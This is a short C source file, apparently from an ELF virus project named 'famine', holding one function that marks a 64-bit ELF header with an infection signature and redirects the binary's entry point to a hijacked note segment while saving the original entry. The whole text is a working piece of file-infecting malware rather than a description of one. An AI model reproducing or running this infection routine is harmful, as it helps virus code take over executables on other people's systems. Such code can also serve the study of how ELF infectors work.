#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void modify_header(struct s_info *info, Elf64_Ehdr *header)
{
	*(uint32_t *)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;

	info->old_entry = header->e_entry;
	header->e_entry = info->note->p_vaddr;
	info->new_entry = header->e_entry;
}
